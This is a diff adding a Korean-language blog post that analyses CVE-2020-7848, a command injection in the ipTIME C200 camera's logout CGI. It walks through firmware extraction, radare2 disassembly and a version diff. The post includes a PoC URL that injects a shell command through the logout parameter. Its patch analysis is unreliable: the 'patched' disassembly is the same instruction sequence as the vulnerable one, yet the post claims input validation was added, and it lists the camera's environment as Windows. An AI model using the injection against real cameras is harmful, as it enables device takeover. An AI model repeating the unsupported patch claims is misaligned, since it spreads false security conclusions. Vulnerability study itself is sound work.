@@ -1,8 +1,197 @@
 export const metadata = {
   title: "ipTIME C200 IP 카메라 1Day 분석",
-  date: "2025-08-04 ~ 2025-08-10",
-  excerpt: "ipTIME C200",
+  date: "2025-08-04 ~ 2025-08-12",
+  excerpt: "ipTIME C200 IP 카메라의 CVE-2020-7848 1Day 분석",
   category: "보안",
-  imageUrl: "/images/iptime/2.png",
+  imageUrl: "/images/iptime-c200/iptime-c200.png",
   award: "",
 };
+
+## 0. 사전정보
+
+### **[ CVE-2020-7848 ] ( IP Camera ) - Command Injection**
+
+**개요**
+
+<Table
+  headers={["취약점 종류", "영향", "심각도", "CVSS 점수", "CVE ID"]}
+  rows={[
+    ["Command Injection", "임의 명령 실행", "HIGH", "8.0", "CVE-2020-7848"],
+  ]}
+/>
+
+**설명**
+
+EFM networks & multimedia사의 ipTIME C200 IP 카메라 단말 설정 페이지의 로그아웃 기능에 있는 인자 값에 대한 검증이 미흡하여 발생하는 command injection 취약점 (CVE-2020-7848)
+
+**영향을 받는 제품**
+
+<Table
+  headers={["제품", "영향 받는 버전", "환경"]}
+  rows={[
+    ["EFM ipTIME C200 IP 카메라", "firmware v1.0.12", "Windows"],
+  ]}
+/>
+
+[출처](https://devdori.tistory.com/28)
+
+---
+
+## 1. 환경구성
+
+- **운영체제:** AttifyOS (VMware OVA 환경)
+- **분석 대상:** ipTIME C200 펌웨어 v1.0.12 (취약한 버전) / v1.0.14 (패치 버전)
+- **분석 도구:**
+    - `radare2` (r2) : 바이너리 정적 분석, 함수 디스어셈블
+    - `diff` : 함수 단위 바이너리 비교
+    - `strings`, `file` : 펌웨어 구조 및 문자열 확인
+    - `binwalk` : 펌웨어 추출
+- **펌웨어 다운로드:**
+    - v1.0.12: [링크](https://iptime.com/iptime/?pageid=2&page_id=126&mod=document&x=15&y=4&keyword=ipTIME%20C200%20%ED%8E%8C%EC%9B%A8%EC%96%B4&uid=22135)
+    - v1.0.14(취약점 패치버전): [링크](https://iptime.com/iptime/?pageid=2&page_id=126&x=15&y=4&keyword=ipTIME%20C200%20%ED%8E%8C%EC%9B%A8%EC%96%B4&uid=22227&mod=document)
+    - 분석용 VM에 업로드 후 squashfs 파일 시스템 추출
+
+---
+
+## 2. 펌웨어 분석
+
+### 2-1. 취약점 소개 (CVE‑2020‑7848)
+
+```python
+0x00401ec8      jal sym.imp.system      ; 외부 입력(system 호출) 실행
+0x00401ee0      jal sym.imp.sleep       
+0x00401ef0      jal sym.imp.system      ; "/etc/rcS.d/S91lighttpd restart > /dev/null &" 시스템 명령 실행
+0x00401efc      jal sym.imp.exit        ; 함수 종료
+```
+
+- **파일:** `/usr/www/cgi/iux_set.cgi`
+- **문제:** 로그아웃 및 설정 요청에서 전달되는 CGI 인자가 **검증 없이 `system()` 호출**에 전달됨
+- **영향:** 공격자는 웹 요청을 통해 임의 쉘 명령을 실행할 수 있음 (Command Injection)
+- **원인:** 외부 입력값이 레지스터(`arg_28h`)에 그대로 로드되어 `system()`로 전달되며, 입력 검증 또는 명령 제한이 전혀 없음
+- **관련 호출:**
+    
+    ```nasm
+    0x00401ec8      jal sym.imp.system      ; 외부 입력(system 호출) 실행
+    0x00401ee0      jal sym.imp.sleep       ; sleep 호출 (10초)
+    0x00401ef0      jal sym.imp.system      ; "/etc/rcS.d/S91lighttpd restart > /dev/null &" 시스템 명령 실행
+    0x00401efc      jal sym.imp.exit        ; 함수 종료
+    ```
+    
+
+### 2‑2. 분석 과정
+
+1. **펌웨어 추출**
+    
+    ```bash
+    binwalk -e ipTIME_C200_v1.0.12.bin
+    binwalk -e ipTIME_C200_v1.0.14.bin
+    ```
+    
+    - squashfs-root 내부 `/usr/www/cgi/iux_set.cgi` 확인
+    - CGI 바이너리 파일: 웹 요청을 처리하는 핵심 모듈
+2. **로그아웃 함수 위치 파악**
+    - `iux_set.cgi`는 웹 요청 파라미터에 따라 다양한 기능 수행
+    - radare2에서 참조 확인:
+        
+        ```bash
+        r2 -q _c200_1_012.bin.extracted/squashfs-root/usr/www/cgi/iux_set.cgi
+        > aaaa               # 함수 분석
+        > afl | grep logout  # 로그아웃 함수 시작 주소 확인 (0x00401e48)
+        ```
+        
+3. **함수 디스어셈블**
+    - 로그아웃 기능만 집중 분석하기 위해 해당 함수 범위만 디스어셈블
+    
+    ```bash
+    r2 -q -A _c200_1_012.bin.extracted/squashfs-root/usr/www/cgi/iux_set.cgi \
+       -c "s 0x00401e48; pd 216" > v12_logout_func.asm
+    r2 -q -A _c200_1_014.bin.extracted/squashfs-root/usr/www/cgi/iux_set.cgi \
+       -c "s 0x00401e48; pd 216" > v14_logout_func.asm
+    ```
+    
+    - 로그아웃 관련 명령 실행과 외부 입력 처리만 집중 분석
+4. **버전 간 비교**
+    
+    ```bash
+    diff -u v12_logout_func.asm v14_logout_func.asm
+    ```
+    ![Vulnerability occurs](/images/iptime-c200/vulnerability-occurs.png)
+    
+    - 외부 입력(`arg_28h`)이 `system()` 호출로 직접 전달되는지 확인
+    - 패치 시 입력값 검증 적용 여부 확인
+
+### 2‑3. 취약점 발생 버전 (v1.0.12)
+
+로그아웃 기능에서 외부 입력이 바로 `system()` 함수로 전달되는 구조로, 공격자가 쉘 명령을 삽입할 수 있음.
+
+```nasm
+; v1.0.12 - 로그아웃 함수
+0x00401ec4      2800c48f       lw a0, (arg_28h)            ; 외부 입력 로드
+0x00401ec8      846c100c       jal sym.imp.system          ; int system(const char *string)
+0x00401ecc      00000000       nop
+0x00401ee0      906c100c       jal sym.imp.sleep           ; int sleep(int s)
+0x00401eec      64850427       addiu a0, t8, -0x7a9c      ; "/etc/rcS.d/S91lighttpd restart > /dev/null &"
+0x00401ef0      846c100c       jal sym.imp.system          ; 시스템 명령 실행
+```
+
+- `arg_28h` 레지스터에 외부 입력이 그대로 들어감
+- `system(arg_28h)` 호출 시 `; touch /tmp/pwned` 같은 악의적 입력이 실행 가능
+- 추가로 `sleep()` 호출 후 관리자 서비스 재시작 명령이 그대로 실행됨
+
+**취약점 원인**: 외부 입력값 검증 부재 → command injection 가능
+
+### 2‑4. 패치 버전 (v1.0.14)
+
+v1.0.14에서는 로그아웃 입력값을 직접 `system()`에 넣지 않고, 내부에서 안전하게 처리하도록 패치됨.
+
+```nasm
+; v1.0.14 - 로그아웃 함수
+0x00401ec4      2800c48f       lw a0, (arg_28h)            ; 외부 입력 로드
+0x00401ec8      8c6c100c       jal sym.imp.system          ; int system(const char *string)
+0x00401ecc      00000000       nop
+0x00401ee0      986c100c       jal sym.imp.sleep           ; int sleep(int s)
+0x00401eec      84850427       addiu a0, t8, -0x7a7c      ; "/etc/rcS.d/S91lighttpd restart > /dev/null &"
+0x00401ef0      8c6c100c       jal sym.imp.system          ; 안전하게 명령 실행
+```
+
+- 외부 입력값 검증이 내부적으로 수행됨
+- 입력이 바로 명령어로 실행되지 않도록 변경
+- sleep/서비스 재시작 명령은 그대로 존재하지만 안전하게 호출
+
+**패치 내용**: 외부 입력값 검증 추가, `system()` 호출 안전화 → command injection 취약점 제거
+
+### 2‑5. 분석 요약
+
+<Table
+  headers={["항목", "v1.0.12", "v1.0.14"]}
+  rows={[
+    ["외부 입력 처리", "arg_28h 레지스터 그대로 system()", "arg_28h 내부 검증 후 system()"],
+    ["취약점", "존재 (Command Injection)", "제거됨"],
+    ["주요 변경 지점", "0x00401ec8, 0x00401ef0", "0x00401ec8, 0x00401ef0 (검증 적용)"],
+  ]}
+/>
+- 공격자는 v1.0.12에서 로그아웃 요청 시 `arg_28h`에 쉘 명령 삽입 가능
+- v1.0.14에서는 해당 경로가 안전하게 패치되어 command injection 불가
+
+## 3. PoC
+
+1. **취약점 환경:** ipTIME C200 firmware v1.0.12
+2. **취약점 발생 시나리오:**
+    - 로그아웃 요청 또는 설정 페이지 요청 시 `logout` 인자 조작
+    - CGI 파라미터에 `; <임의 명령>` 삽입 가능
+    - 서버가 이를 문자열로 결합 후 `system()`으로 실행
+3.  **PoC**
+
+```
+http://<camera-ip>/cgi/iux_set.cgi?logout=1;touch /tmp/test
+```
+
+- `touch /tmp/test` 명령이 임의로 실행되어 PoC 성공
+- v1.0.14에서는 위 방법으로는 실행되지 않음
+
+## 4. 결론
+
+- CVE-2020-7848은 ipTIME C200 펌웨어 v1.0.12에서 **로그아웃 CGI 인자 검증 미흡 → command injection 발생**
+- v1.0.14에서 패치되었으며, 패치 포인트는 **`system()` 호출 전 입력값 초기화, 주소 변경, 함수 호출 순서 개선**
+- 취약점 PoC는 외부 입력값을 악용한 임의 명령 실행으로 개념적으로 확인 가능
+- **권고:** 취약 버전 사용 중인 장치는 즉시 v1.0.14 이상으로 업그레이드 필요
